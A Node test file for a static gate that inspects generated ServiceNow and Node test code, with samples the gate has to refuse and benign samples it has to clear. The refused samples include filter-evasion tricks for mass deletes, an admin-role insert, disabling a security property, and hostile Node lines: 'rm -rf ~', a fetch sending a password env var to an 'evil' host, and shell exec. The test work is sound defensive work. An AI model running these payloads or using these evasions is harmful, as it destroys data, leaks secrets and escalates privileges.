// Review W7b, H1 — the gate bypasses that executed before 2026-09-26, pinned.
//
// Every source in `MUST_REFUSE` cleared the gate before this review and each
// one runs a denied thing: an unbounded delete reached through a parenthesised
// or comma member expression, through an alias called with `.call`/`.apply`,
// through `Function.prototype.call.call`, through an array element, through a
// computed subscript read now and called later; the `*WithReferences` DML
// family, `GlideMultipleDelete`/`GlideMultipleUpdate`, `gs.setProperty`, an
// aliased `gs`, attachment deletion, the Rhino Java bridge, Node payloads in a
// Playwright/unit spec, and a whole script hidden in a YAML double-quoted
// scalar (which the JS lexer reads as one string).
//
// `MUST_CLEAR` is the other half: ordinary bodies a generated spec actually
// contains. A deny-list widened until it refuses these would pass every row
// above and ship nothing.

import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { untrusted } from "@tessera/types";

import { inspectGeneratedSource } from "../build/index.js";

function gated(source) {
  return inspectGeneratedSource(untrusted(source));
}

function rulesOf(verdict) {
  return verdict.ok ? [] : verdict.violations.map((v) => v.rule);
}

const GR = "var gr=new GlideRecord('incident'); gr.query(); ";

/** name → [source, a rule that must be among the reported ones] */
const MUST_REFUSE = {
  paren_member: [`${GR}(gr.deleteMultiple)();`, "delete-multiple"],
  paren_insert: [
    "var gr=new GlideRecord('incident'); (gr.insert)();",
    "insert",
  ],
  comma_expr: [`${GR}(0, gr.deleteMultiple)();`, "delete-multiple"],
  alias_call: [`${GR}var f=gr.deleteMultiple; f.call(gr);`, "delete-multiple"],
  alias_call_indirect: [
    `${GR}var f=gr.deleteMultiple; f.call(gr);`,
    "indirect-invoke",
  ],
  alias_apply: [
    `${GR}var f=gr.deleteMultiple; f.apply(gr,[]);`,
    "indirect-invoke",
  ],
  call_call: [
    `${GR}Function.prototype.call.call(gr.deleteMultiple, gr);`,
    "prototype-access",
  ],
  array_index: [`${GR}[gr.deleteMultiple][0].call(gr);`, "delete-multiple"],
  computed_alias: [
    "var k='deleteMultiple'; var gr=new GlideRecord('incident'); gr.query(); var m=gr[k]; m.call(gr);",
    "computed-member",
  ],
  computed_alias_literal_name: [
    "var k='deleteMultiple'; var gr=new GlideRecord('incident'); var m=gr[k];",
    "delete-multiple",
  ],
  insert_with_refs: [
    "var gr=new GlideRecord('incident'); gr.insertWithReferences();",
    "dml-family-member",
  ],
  update_with_refs: [
    "var gr=new GlideRecord('incident'); gr.get('x'); gr.updateWithReferences();",
    "dml-family-member",
  ],
  multi_delete: [
    "var md=new GlideMultipleDelete('incident'); md.addQuery('active',true); md.execute();",
    "glide-multiple-dml",
  ],
  multi_update: [
    "var mu=new GlideMultipleUpdate('incident'); mu.setValue('state',7); mu.execute();",
    "glide-multiple-dml",
  ],
  set_property: ["gs.setProperty('glide.security.x','false');", "set-property"],
  attachment_delete: [
    "new GlideSysAttachment().deleteAttachment('abc');",
    "sys-attachment",
  ],
  table_in_string: [
    "var r=new GlideRecord('sys_user_has_role'); r.initialize(); r.setValue('role','admin'); r.insertWithReferences();",
    "role-table",
  ],
  event_queue_alias: ["var g=gs; g.eventQueue('x', null, '', '');", "gs-alias"],
  event_queue_alias_member: [
    "var g=gs; g.eventQueue('x', null, '', '');",
    "gs-event-queue",
  ],
  this_gs: ["var g=this.gs; g.log('x');", "gs-alias"],
  glide_record_alias: [
    "var G=GlideRecord; var r=new G('incident');",
    "glide-record-alias",
  ],
  packages: ["Packages.java.lang.Runtime.getRuntime();", "java-bridge"],
  java_import: ["var rt = java.lang.Runtime;", "java-bridge"],
  node_static_import: [
    "import { execSync } from 'node:child_process'; execSync('rm -rf ~'); expect(1).toBe(2);",
    "node-runtime",
  ],
  node_fetch: [
    "await fetch('https://evil/'+process.env.SNPF_PASSWORD); expect(a).toBe(b);",
    "node-runtime",
  ],
  node_dynamic_import: [
    "const m = await import('node:fs'); m.rmSync('/x',{recursive:true});",
    "node-runtime",
  ],
  node_require: ["require('child_process').exec('id');", "node-runtime"],
  node_from_fs: ["import { rmSync } from 'fs'; rmSync('/x');", "node-runtime"],
  constructor_chain: [
    "var F = x.constructor.constructor; F('return 1')();",
    "prototype-access",
  ],
  reflect_in_string: ["var n = 'Reflect';", "reflect"],
  bind_alias: ["var f = gr.getValue.bind(gr);", "indirect-invoke"],
  object_computed_key: ["var o = { [name]: 1 };", "computed-member"],
  destructure_member: ["var { deleteMultiple: d } = gr;", "destructuring"],
  destructure_assign: ["var d; ({ query: d } = gr);", "destructuring"],
  optional_subscript: ["var v = gr?.[k];", "computed-member"],
  string_subscript: ["var v = 'abc'[k];", "computed-member"],
  literal_denied_key: ['var f = gr["deleteMultiple"];', "computed-member"],
  yaml_double_quoted: [
    "name: t\nsteps:\n  - type: Run Server Side Script\n    script: \"var gr = new GlideRecord('incident'); gr.query(); gr.deleteMultiple();\"\n",
    "delete-multiple",
  ],
  yaml_double_quoted_computed: [
    'name: t\nsteps:\n  - script: "var m = gr[k]; m(gr);"\n',
    "computed-member",
  ],
  yaml_comment_hide: [
    "name: t\nsteps:\n  # /*\n  - type: Run Server Side Script\n    script: |\n      var gr=new GlideRecord('incident'); gr.query(); gr.deleteMultiple();\n  # */\n  - expected: 1\n",
    "delete-multiple",
  ],
  comment_mention: [
    "// gr.deleteMultiple() is forbidden\nvar a = 1;",
    "delete-multiple",
  ],
};

const MUST_CLEAR = {
  clean_unit: [
    "// Regression guard: a critical incident keeps priority 1.",
    "describe('incident priority', function () {",
    "  it('stays at 1 when impact and urgency are both 1', function () {",
    "    var gr = new GlideRecord('incident');",
    "    gr.addQuery('sys_id', FIXTURE_SYS_ID);",
    "    gr.query();",
    "    assertTrue(gr.next(), 'the fixture incident is readable');",
    "    assertEquals('1', String(gr.getValue('priority')));",
    "  });",
    "});",
  ].join("\n"),
  live_good_body: [
    "(function (outputs, steps, params, stepResult, assertEqual) {",
    "  var d = new LiveDiscount();",
    '  assertEqual({ name: "below threshold pays full price", shouldbe: 990, value: d.apply(99, 10) });',
    "})(outputs, steps, params, stepResult, assertEqual);",
  ].join("\n"),
  playwright: [
    'import { test, expect } from "@playwright/test";',
    "",
    'test("the incident form shows the number", async ({ page }) => {',
    '  await page.goto("/incident.do");',
    "  await page.fill('input[name=\"short_description\"]', 'x');",
    '  await expect(page.locator("#number")).toHaveText(/INC/);',
    "});",
  ].join("\n"),
  e2e_yaml: [
    "name: incident priority",
    "steps:",
    "  - type: Record Validation",
    "    table: incident",
    '    expected: "1"',
  ].join("\n"),
  numeric_and_literal_subscripts: [
    "var first = rows[0];",
    'var v = map["key"];',
    "var w = map['short_description'];",
    "assertEquals(first, v);",
  ].join("\n"),
  array_literals: [
    "var list = [1, 2, 3];",
    "function f() { return [list[0], list[1]]; }",
    "assertEquals(3, f().length);",
  ].join("\n"),
  gs_member_calls:
    "gs.info('x'); var u = gs.getUserID(); assertTrue(u !== '');",
  os_word_in_string: "assertEquals('os', platform.name);",
};

describe("gate W7b — every executed bypass is refused (H1)", () => {
  for (const [name, [source, rule]] of Object.entries(MUST_REFUSE)) {
    it(`refuses ${name} (reports ${rule})`, () => {
      const verdict = gated(source);
      assert.equal(verdict.ok, false, `${name} cleared`);
      assert.ok(
        rulesOf(verdict).includes(rule),
        `${name}: expected ${rule}, got ${rulesOf(verdict).join(",")}`,
      );
    });
  }
});

describe("gate W7b — ordinary generated bodies still clear", () => {
  for (const [name, source] of Object.entries(MUST_CLEAR)) {
    it(`clears ${name}`, () => {
      const verdict = gated(source);
      assert.deepEqual(rulesOf(verdict), [], `${name} was refused`);
    });
  }
});

describe("gate W7b — no source bytes in the new rules' reports (TM-1)", () => {
  it("carries no slice of the source in any W7b rejection", () => {
    const canary = "canaryw7bnevershow";
    for (const [source] of Object.values(MUST_REFUSE)) {
      const verdict = gated(`${source}\n// ${canary}`);
      assert.equal(verdict.ok, false);
      assert.doesNotMatch(JSON.stringify(verdict.violations), /canaryw7b/);
    }
  });
});
